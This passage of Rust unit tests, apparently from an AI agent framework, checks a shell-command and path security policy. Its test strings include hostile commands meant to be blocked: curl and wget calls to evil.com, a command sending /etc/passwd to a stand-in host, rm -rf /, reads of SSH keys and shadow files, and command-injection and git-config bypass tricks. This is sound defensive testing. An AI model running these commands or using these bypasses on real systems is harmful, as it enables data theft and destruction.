            block_high_risk_commands: false,
            workspace_dir: workspace.clone(),
            allowed_commands: vec!["cat".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "cat".into(),
                action: crate::config::CommandContextRuleAction::Allow,
                allowed_domains: vec![],
                allowed_path_prefixes: vec!["sandbox/allow".into()],
                denied_path_prefixes: vec!["sandbox".into()],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        assert!(
            p.validate_command_execution_with_reason("cat sandbox/allow/nested/file.txt", true)
                .is_ok(),
            "a narrower allowed_path_prefix should override a broader denied_path_prefix"
        );

        let blocked = p
            .validate_command_execution_with_reason("cat sandbox/blocked/file.txt", true)
            .expect_err("siblings outside the explicit allow path must remain blocked");
        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn command_context_allow_rule_more_specific_denied_path_prefix_still_blocks() {
        let root =
            std::env::temp_dir().join("zeroclaw_test_command_context_allow_denied_specificity");
        let workspace = root.join("workspace");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(workspace.join("sandbox").join("public")).unwrap();
        std::fs::create_dir_all(workspace.join("sandbox").join("private")).unwrap();

        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            block_high_risk_commands: false,
            workspace_dir: workspace.clone(),
            allowed_commands: vec!["cat".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "cat".into(),
                action: crate::config::CommandContextRuleAction::Allow,
                allowed_domains: vec![],
                allowed_path_prefixes: vec!["sandbox".into()],
                denied_path_prefixes: vec!["sandbox/private".into()],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        assert!(p
            .validate_command_execution_with_reason("cat sandbox/public/file.txt", true)
            .is_ok());

        let blocked = p
            .validate_command_execution_with_reason("cat sandbox/private/key.txt", true)
            .expect_err("a more specific denied_path_prefix must still win");
        assert_eq!(blocked.policy_id(), "autonomy.command_context_rules");

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn enforce_tool_operation_read_allowed_in_readonly_mode() {
        let p = readonly_policy();
        assert!(p
            .enforce_tool_operation(ToolOperation::Read, "memory_recall")
            .is_ok());
    }

    #[test]
    fn enforce_tool_operation_act_blocked_in_readonly_mode() {
        let p = readonly_policy();
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("config_key=autonomy.read_only"));
        let event = parse_security_policy_block_event(&err)
            .expect("tool read-only block should render as structured policy event");
        assert_eq!(event.policy_id, READ_ONLY_POLICY_ID);
        assert_eq!(event.command_fragment, "memory_store");
        assert_eq!(event.config_key(), Some(READ_ONLY_POLICY_ID));
        assert!(event.reason.contains(READ_ONLY_REASON));
    }

    #[test]
    fn enforce_tool_operation_act_uses_rate_budget() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..default_policy()
        };
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("config_key=autonomy.max_actions_per_hour"));
        let event = parse_security_policy_block_event(&err)
            .expect("tool rate-limit block should render as structured policy event");
        assert_eq!(event.policy_id, MAX_ACTIONS_POLICY_ID);
        assert_eq!(event.command_fragment, "memory_store");
        assert_eq!(event.config_key(), Some(MAX_ACTIONS_POLICY_ID));
        assert!(event.reason.contains("Rate limit exceeded"));
    }

    // ── is_command_allowed ───────────────────────────────────

    #[test]
    fn allowed_commands_basic() {
        let p = default_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("cargo build --release"));
        assert!(p.is_command_allowed("cat file.txt"));
        assert!(p.is_command_allowed("grep -r pattern ."));
        assert!(p.is_command_allowed("date"));
    }

    #[test]
    fn blocked_commands_basic() {
        let p = default_policy();
        assert!(!p.is_command_allowed("rm -rf /"));
        assert!(!p.is_command_allowed("sudo apt install"));
        assert!(!p.is_command_allowed("curl http://evil.com"));
        assert!(!p.is_command_allowed("wget http://evil.com"));
        assert!(!p.is_command_allowed("python3 exploit.py"));
        assert!(!p.is_command_allowed("node malicious.js"));
    }

    #[test]
    fn validate_command_execution_reports_allowed_commands_config_surface() {
        let policy = default_policy();
        let violation = policy
            .validate_command_execution_with_reason("curl https://evil.example", false)
            .expect_err("curl must remain blocked by the global allowlist");
        assert_eq!(violation.policy_id(), "autonomy.allowed_commands");
        assert_eq!(violation.config_key(), Some("autonomy.allowed_commands"));
        assert!(violation
            .format_block_message()
            .contains("config_key=autonomy.allowed_commands"));
        assert!(violation
            .to_string()
            .contains("policy=autonomy.allowed_commands"));
        assert!(violation
            .to_string()
            .contains("command=curl https://evil.example"));
        assert!(violation
            .to_string()
            .contains("config_key=autonomy.allowed_commands"));
        assert!(violation
            .to_string()
            .contains("Command blocked by allowed_commands"));
        assert!(violation.to_string().contains("segment_command=curl"));
        assert!(violation.to_string().contains("context_override=none"));
    }

    #[test]
    fn is_command_allowed_respects_command_context_rules() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.allowed_commands = vec!["curl".into()];
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Deny,
            allowed_domains: vec!["evil.example".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: false,
        }];

        let workspace = std::env::temp_dir().join("zeroclaw_test_command_context_rules_is_allowed");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert!(policy.is_command_allowed("curl https://api.example.com/data"));
        assert!(!policy.is_command_allowed("curl https://evil.example/data"));
    }

    #[test]
    fn is_command_allowed_context_allow_rule_can_override_empty_global_allowlist() {
        let mut autonomy_config = crate::config::AutonomyConfig::default();
        autonomy_config.level = AutonomyLevel::Full;
        autonomy_config.allowed_commands = vec![];
        autonomy_config.command_context_rules = vec![crate::config::CommandContextRuleConfig {
            command: "curl".into(),
            action: crate::config::CommandContextRuleAction::Allow,
            allowed_domains: vec!["api.example.com".into()],
            allowed_path_prefixes: vec![],
            denied_path_prefixes: vec![],
            allow_high_risk: false,
        }];

        let workspace =
            std::env::temp_dir().join("zeroclaw_test_is_allowed_context_override_allowlist");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert!(policy.is_command_allowed("curl https://api.example.com/data"));
        assert!(!policy.is_command_allowed("curl https://evil.example/data"));
    }

    #[test]
    fn readonly_blocks_all_commands() {
        let p = readonly_policy();
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat file.txt"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn full_autonomy_still_uses_allowlist() {
        let p = full_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("rm -rf /"));
    }

    #[test]
    fn unrestricted_commands_bypass_shell_policy_gates() {
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            unrestricted_commands: vec!["curl".into()],
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "curl".into(),
                action: crate::config::CommandContextRuleAction::Deny,
                allowed_domains: vec!["evil.example".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        let allowed = policy
            .validate_command_execution_with_reason("curl </etc/passwd https://evil.example", false)
            .expect("unrestricted command should bypass command, path, and structure gates");
        assert_eq!(allowed, CommandRiskLevel::Low);
    }

    #[test]
    fn command_with_absolute_path_extracts_basename() {
        let p = default_policy();
        assert!(p.is_command_allowed("/usr/bin/git status"));
        assert!(p.is_command_allowed("/bin/ls -la"));
    }

    #[test]
    fn allowlist_supports_explicit_executable_paths() {
        let p = SecurityPolicy {
            allowed_commands: vec!["/usr/bin/antigravity".into()],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("/usr/bin/antigravity"));
        assert!(!p.is_command_allowed("antigravity"));
    }

    #[test]
    fn allowlist_supports_wildcard_entry() {
        let p = SecurityPolicy {
            allowed_commands: vec!["*".into()],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("python3 --version"));
        assert!(p.is_command_allowed("/usr/bin/antigravity"));

        // Wildcard still respects risk gates in validate_command_execution.
        let blocked = p.validate_command_execution("rm -rf tmp_test_dir", true);
        assert!(blocked.is_err());
        assert!(blocked.unwrap_err().contains("high-risk"));
    }

    #[test]
    fn empty_command_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed(""));
        assert!(!p.is_command_allowed("   "));
    }

    #[test]
    fn command_with_pipes_validates_all_segments() {
        let p = default_policy();
        // Both sides of the pipe are in the allowlist
        assert!(p.is_command_allowed("ls | grep foo"));
        assert!(p.is_command_allowed("cat file.txt | wc -l"));
        // Second command not in allowlist — blocked
        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
        assert!(!p.is_command_allowed("echo hello | python3 -"));
    }

    #[test]
    fn custom_allowlist() {
        let p = SecurityPolicy {
            allowed_commands: vec!["docker".into(), "kubectl".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("docker ps"));
        assert!(p.is_command_allowed("kubectl get pods"));
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("git status"));
    }

    #[test]
    fn empty_allowlist_blocks_everything() {
        let p = SecurityPolicy {
            allowed_commands: vec![],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn command_risk_low_for_read_commands() {
        let p = default_policy();
        assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
        assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
    }

    #[test]
    fn command_risk_medium_for_mutating_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["git".into(), "touch".into()],
            ..SecurityPolicy::default()
        };
        assert_eq!(
            p.command_risk_level("git reset --hard HEAD~1"),
            CommandRiskLevel::Medium
        );
        assert_eq!(
            p.command_risk_level("touch file.txt"),
            CommandRiskLevel::Medium
        );
    }

    #[test]
    fn command_risk_high_for_dangerous_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["rm".into()],
            ..SecurityPolicy::default()
        };
        assert_eq!(
            p.command_risk_level("rm -rf /tmp/test"),
            CommandRiskLevel::High
        );
    }

    #[test]
    fn validate_command_requires_approval_for_medium_risk() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            require_approval_for_medium_risk: true,
            allowed_commands: vec!["touch".into()],
            ..SecurityPolicy::default()
        };

        let denied = p.validate_command_execution("touch test.txt", false);
        assert!(denied.is_err());
        assert!(denied.unwrap_err().contains("requires explicit approval"),);

        let allowed = p.validate_command_execution("touch test.txt", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_blocks_high_risk_by_default() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            allowed_commands: vec!["rm".into()],
            ..SecurityPolicy::default()
        };

        let result = p.validate_command_execution("rm -rf tmp_test_dir", true);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("high-risk"));
    }

    #[test]
    fn validate_command_full_mode_skips_medium_risk_approval_gate() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            require_approval_for_medium_risk: true,
            allowed_commands: vec!["touch".into()],
            ..SecurityPolicy::default()
        };

        let result = p.validate_command_execution("touch test.txt", false);
        assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_rejects_background_chain_bypass() {
        let p = default_policy();
        let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    // ── is_path_allowed ─────────────────────────────────────

    #[test]
    fn relative_paths_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed("file.txt"));
        assert!(p.is_path_allowed("src/main.rs"));
        assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
    }

    #[test]
    fn path_traversal_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
        assert!(!p.is_path_allowed(".."));
    }

    #[test]
    fn absolute_paths_blocked_when_workspace_only() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn absolute_paths_allowed_when_not_workspace_only() {
        let p = SecurityPolicy {
            workspace_only: false,
            forbidden_paths: vec![],
            ..SecurityPolicy::default()
        };
        assert!(p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn allowed_root_overrides_broader_forbidden_parent_for_path_checks() {
        let root = std::env::temp_dir().join("zeroclaw_test_forbidden_allowed_overlap");
        let forbidden = root.join("forbidden_root");
        let allowed = forbidden.join("allowed_root");
        let nested = allowed.join("nested").join("file.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(nested.parent().unwrap()).unwrap();

        let policy = SecurityPolicy {
            workspace_only: true,
            forbidden_paths: vec![forbidden.display().to_string()],
            allowed_roots: vec![allowed.clone()],
            ..SecurityPolicy::default()
        };

        assert!(
            policy.is_path_allowed(&nested.display().to_string()),
            "explicitly allowlisted subpaths must bypass broader forbidden parents"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn relative_forbidden_parent_can_be_overridden_by_more_specific_allowed_root() {
        let root = std::env::temp_dir().join("zeroclaw_test_relative_forbidden_allowed_overlap");
        let workspace = root.join("workspace");
        let nested = workspace
            .join("sandbox")
            .join("allow")
            .join("nested")
            .join("file.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(nested.parent().unwrap()).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["sandbox".into()],
            allowed_roots: vec![workspace.join("sandbox").join("allow")],
            ..SecurityPolicy::default()
        };

        assert!(
            policy.is_path_allowed("sandbox/allow/nested/file.txt"),
            "workspace-relative forbidden parents should honor a more specific allowed_root"
        );
        assert!(
            !policy.is_path_allowed("sandbox/blocked/file.txt"),
            "siblings outside the explicit allow root must remain blocked"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn more_specific_forbidden_path_beats_broader_allowed_root() {
        let root = std::env::temp_dir().join("zeroclaw_test_specific_forbidden_wins");
        let workspace = root.join("workspace");
        let private = workspace.join("sandbox").join("private").join("key.txt");

        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(private.parent().unwrap()).unwrap();

        let policy = SecurityPolicy {
            workspace_dir: workspace.clone(),
            workspace_only: true,
            forbidden_paths: vec!["sandbox/private".into()],
            allowed_roots: vec![workspace.join("sandbox")],
            ..SecurityPolicy::default()
        };

        assert!(
            !policy.is_path_allowed("sandbox/private/key.txt"),
            "a more specific forbidden path must still win over a broader allowed root"
        );
        assert!(
            policy.is_path_allowed("sandbox/public/file.txt"),
            "non-forbidden siblings under the broader allowed root should remain accessible"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn forbidden_paths_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
    }

    #[test]
    fn empty_path_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(""));
    }

    #[test]
    fn dotfile_in_workspace_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(".gitignore"));
        assert!(p.is_path_allowed(".env"));
    }

    // ── from_config ─────────────────────────────────────────

    #[test]
    fn from_config_maps_all_fields() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            allowed_commands: vec!["docker".into()],
            unrestricted_commands: vec!["curl".into()],
            forbidden_paths: vec!["/secret".into()],
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            require_approval_for_medium_risk: false,
            block_high_risk_commands: false,
            allow_unsafe_shell_structures: true,
            shell_env_passthrough: vec!["DATABASE_URL".into()],
            allow_sensitive_file_reads: true,
            allow_sensitive_file_writes: true,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert_eq!(policy.autonomy, AutonomyLevel::Full);
        assert!(!policy.workspace_only);
        assert_eq!(policy.allowed_commands, vec!["docker"]);
        assert_eq!(policy.unrestricted_commands, vec!["curl"]);
        assert_eq!(policy.forbidden_paths, vec!["/secret"]);
        assert_eq!(policy.max_actions_per_hour, 100);
        assert_eq!(policy.max_cost_per_day_cents, 1000);
        assert!(!policy.require_approval_for_medium_risk);
        assert!(!policy.block_high_risk_commands);
        assert!(policy.allow_unsafe_shell_structures);
        assert_eq!(policy.shell_env_passthrough, vec!["DATABASE_URL"]);
        assert!(policy.allow_sensitive_file_reads);
        assert!(policy.allow_sensitive_file_writes);
        assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
    }

    #[test]
    fn from_config_normalizes_allowed_roots() {
        let autonomy_config = crate::config::AutonomyConfig {
            allowed_roots: vec!["~/Desktop".into(), "shared-data".into()],
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let expected_home_root = if let Some(home) = home_dir() {
            home.join("Desktop")
        } else {
            PathBuf::from("~/Desktop")
        };

        assert_eq!(policy.allowed_roots[0], expected_home_root);
        assert_eq!(policy.allowed_roots[1], workspace.join("shared-data"));
    }

    #[test]
    fn resolved_path_violation_message_includes_allowed_roots_guidance() {
        let p = default_policy();
        let msg = p.resolved_path_violation_message(Path::new("/tmp/outside.txt"));
        assert!(msg.contains("escapes workspace"));
        assert!(msg.contains("allowed_roots"));
    }

    // ── Default policy ──────────────────────────────────────

    #[test]
    fn default_policy_has_sane_values() {
        let p = SecurityPolicy::default();
        assert_eq!(p.autonomy, AutonomyLevel::Supervised);
        assert!(p.workspace_only);
        assert!(!p.allowed_commands.is_empty());
        assert!(!p.forbidden_paths.is_empty());
        assert_eq!(p.max_actions_per_hour, 100);
        assert_eq!(p.max_cost_per_day_cents, 1000);
        assert!(p.require_approval_for_medium_risk);
        assert!(p.block_high_risk_commands);
        assert!(p.shell_env_passthrough.is_empty());
    }

    #[test]
    fn default_policy_matches_default_autonomy_config() {
        let autonomy = crate::config::AutonomyConfig::default();
        let policy = SecurityPolicy::default();
        let from_config = SecurityPolicy::from_config(&autonomy, Path::new("."));

        assert_eq!(policy.autonomy, from_config.autonomy);
        assert_eq!(policy.workspace_only, from_config.workspace_only);
        assert_eq!(policy.allowed_commands, from_config.allowed_commands);
        assert_eq!(
            policy.unrestricted_commands,
            from_config.unrestricted_commands
        );
        assert_eq!(
            policy.command_context_rules.len(),
            from_config.command_context_rules.len()
        );
        assert_eq!(policy.forbidden_paths, from_config.forbidden_paths);
        assert_eq!(policy.allowed_roots, from_config.allowed_roots);
        assert_eq!(
            policy.max_actions_per_hour,
            from_config.max_actions_per_hour
        );
        assert_eq!(
            policy.max_cost_per_day_cents,
            from_config.max_cost_per_day_cents
        );
        assert_eq!(
            policy.require_approval_for_medium_risk,
            from_config.require_approval_for_medium_risk
        );
        assert_eq!(
            policy.block_high_risk_commands,
            from_config.block_high_risk_commands
        );
        assert_eq!(
            policy.allow_unsafe_shell_structures,
            from_config.allow_unsafe_shell_structures
        );
        assert_eq!(
            policy.shell_env_passthrough,
            from_config.shell_env_passthrough
        );
        assert_eq!(
            policy.allow_sensitive_file_reads,
            from_config.allow_sensitive_file_reads
        );
        assert_eq!(
            policy.allow_sensitive_file_writes,
            from_config.allow_sensitive_file_writes
        );
    }

    // ── ActionTracker / rate limiting ───────────────────────

    #[test]
    fn action_tracker_starts_at_zero() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.count(), 0);
    }

    #[test]
    fn action_tracker_records_actions() {
        let tracker = ActionTracker::new();
        assert_eq!(tracker.record(), 1);
        assert_eq!(tracker.record(), 2);
        assert_eq!(tracker.record(), 3);
        assert_eq!(tracker.count(), 3);
    }

    #[test]
    fn record_action_allows_within_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 5,
            ..SecurityPolicy::default()
        };
        for _ in 0..5 {
            assert!(p.record_action(), "should allow actions within limit");
        }
    }

    #[test]
    fn record_action_blocks_over_limit() {
        let p = SecurityPolicy {
            max_actions_per_hour: 3,
            ..SecurityPolicy::default()
        };
        assert!(p.record_action()); // 1
        assert!(p.record_action()); // 2
        assert!(p.record_action()); // 3
        assert!(!p.record_action()); // 4 — over limit
    }

    #[test]
    fn is_rate_limited_reflects_count() {
        let p = SecurityPolicy {
            max_actions_per_hour: 2,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(!p.is_rate_limited());
        p.record_action();
        assert!(p.is_rate_limited());
    }

    #[test]
    fn action_tracker_clone_is_independent() {
        let tracker = ActionTracker::new();
        tracker.record();
        tracker.record();
        let cloned = tracker.clone();
        assert_eq!(cloned.count(), 2);
        tracker.record();
        assert_eq!(tracker.count(), 3);
        assert_eq!(cloned.count(), 2); // clone is independent
    }

    // ── Edge cases: command injection ────────────────────────

    #[test]
    fn command_injection_semicolon_blocked() {
        let p = default_policy();
        // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
        // This is a safe default: chained commands are blocked.
        assert!(!p.is_command_allowed("ls; rm -rf /"));
    }

    #[test]
    fn command_injection_semicolon_no_space() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls;rm -rf /"));
    }

    #[test]
    fn quoted_semicolons_do_not_split_sqlite_command() {
        let p = SecurityPolicy {
            allowed_commands: vec!["sqlite3".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ));
        assert_eq!(
            p.command_risk_level(
                "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
            ),
            CommandRiskLevel::Low
        );
    }

    #[test]
    fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["sqlite3".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /"));
    }

    #[test]
    fn command_injection_backtick_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo `whoami`"));
        assert!(!p.is_command_allowed("echo `rm -rf /`"));
    }

    #[test]
    fn command_injection_dollar_paren_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
        assert!(!p.is_command_allowed("echo $(rm -rf /)"));
    }

    #[test]
    fn command_injection_dollar_paren_literal_inside_single_quotes_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo '$(cat /etc/passwd)'"));
    }

    #[test]
    fn command_injection_dollar_brace_literal_inside_single_quotes_allowed() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo '${HOME}'"));
    }

    #[test]
    fn command_injection_dollar_brace_unquoted_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo ${HOME}"));
    }

    #[test]
    fn command_with_env_var_prefix() {
        let p = default_policy();
        // "FOO=bar" is the first word — not in allowlist
        assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
    }

    #[test]
    fn command_newline_injection_blocked() {
        let p = default_policy();
        // Newline splits into two commands; "rm" is not in allowlist
        assert!(!p.is_command_allowed("ls\nrm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls\necho hello"));
    }

    #[test]
    fn command_injection_and_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls && rm -rf /"));
        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls && echo done"));
    }

    #[test]
    fn command_injection_or_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls || rm -rf /"));
        // Both allowed — OK
        assert!(p.is_command_allowed("ls || echo fallback"));
    }

    #[test]
    fn command_injection_background_chain_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("ls & rm -rf /"));
        assert!(!p.is_command_allowed("ls&rm -rf /"));
        assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
    }

    #[test]
    fn command_injection_redirect_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
        assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
        assert!(!p.is_command_allowed("cat </etc/passwd"));
        assert!(!p.is_command_allowed("cat</etc/passwd"));
    }

    #[test]
    fn wildcard_allowlist_still_blocks_unsafe_shell_structures_by_default() {
        let p = SecurityPolicy {
            allowed_commands: vec!["*".into()],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("echo hello > output.txt"));
        assert!(!p.is_command_allowed("echo $(date)"));
    }

    #[test]
    fn allow_unsafe_shell_structures_opt_in_allows_redirection() {
        let p = SecurityPolicy {
            allowed_commands: vec!["*".into()],
            allow_unsafe_shell_structures: true,
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("echo hello > output.txt"));
    }

    #[test]
    fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
        let p = default_policy();
        assert!(p.is_command_allowed("echo \"A&B\""));
        assert!(p.is_command_allowed("echo \"A>B\""));
        assert!(p.is_command_allowed("echo \"A<B\""));
    }

    #[test]
    fn command_argument_injection_blocked() {
        let p = default_policy();
        // find -exec is a common bypass
        assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
        assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
        // git config write operations can execute commands
        assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
        assert!(!p.is_command_allowed("git alias.st status"));
        assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
        // git config without readonly flag is blocked
        assert!(!p.is_command_allowed("git config user.name \"test\""));
        assert!(!p.is_command_allowed("git config user.email test@example.com"));
        // Legitimate commands should still work
        assert!(p.is_command_allowed("find . -name '*.txt'"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("git add ."));
    }

    #[test]
    fn git_config_readonly_operations_allowed() {
        let p = default_policy();
        // git config --get is read-only and safe
        assert!(p.is_command_allowed("git config --get user.name"));
        assert!(p.is_command_allowed("git config --get user.email"));
        assert!(p.is_command_allowed("git config --get core.editor"));
        // git config --list is read-only and safe
        assert!(p.is_command_allowed("git config --list"));
        assert!(p.is_command_allowed("git config -l"));
        // git config --get-all is read-only
        assert!(p.is_command_allowed("git config --get-all user.name"));
        // git config --get-regexp is read-only
        assert!(p.is_command_allowed("git config --get-regexp user.*"));
        // git config --get-urlmatch is read-only
        assert!(p.is_command_allowed("git config --get-urlmatch http.example.com"));
        // scoped read operations are allowed
        assert!(p.is_command_allowed("git config --global --get user.name"));
        assert!(p.is_command_allowed("git config --local --list"));
        assert!(p.is_command_allowed("git config --global --get user.name --show-origin"));
        assert!(p.is_command_allowed("git config --default=unknown --get user.name"));
    }

    #[test]
    fn git_config_write_operations_blocked() {
        let p = default_policy();
        // Plain git config (write) is blocked
        assert!(!p.is_command_allowed("git config user.name test"));
        assert!(!p.is_command_allowed("git config user.email test@example.com"));
        // git config --unset is a write operation
        assert!(!p.is_command_allowed("git config --unset user.name"));
        // git config --add is a write operation
        assert!(!p.is_command_allowed("git config --add user.name test"));
        // git config --global without readonly flag is blocked
        assert!(!p.is_command_allowed("git config --global user.name test"));
        // git config --replace-all is a write operation
        assert!(!p.is_command_allowed("git config --replace-all user.name test"));
        // git config --edit is blocked (opens editor)
        assert!(!p.is_command_allowed("git config -e"));
        assert!(!p.is_command_allowed("git config --edit"));
    }

    #[test]
    fn git_config_mixed_read_write_flags_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git config --get --unset user.name"));
        assert!(!p.is_command_allowed("git config --list --add user.name test"));
        assert!(!p.is_command_allowed("git config --get-all --replace-all user.name test"));
    }

    #[test]
    fn git_config_global_injection_flags_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("git --config-env=core.editor=EVIL_EDITOR status"));
        assert!(!p.is_command_allowed("git --config=core.pager=cat status"));
        assert!(
            !p.is_command_allowed("git --config-env=credential.helper=EVIL config --get user.name")
        );
        assert!(!p.is_command_allowed("git --config=core.editor=vim config --get user.name"));
    }

    #[test]
    fn command_injection_dollar_brace_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
    }

    #[test]
    fn command_injection_plain_dollar_var_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("cat $HOME/.ssh/id_rsa"));
        assert!(!p.is_command_allowed("cat $SECRET_FILE"));
    }

    #[test]
    fn command_injection_tee_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
        assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
        assert!(!p.is_command_allowed("tee file.txt"));
    }

    #[test]
    fn command_injection_process_substitution_blocked() {
        let p = default_policy();
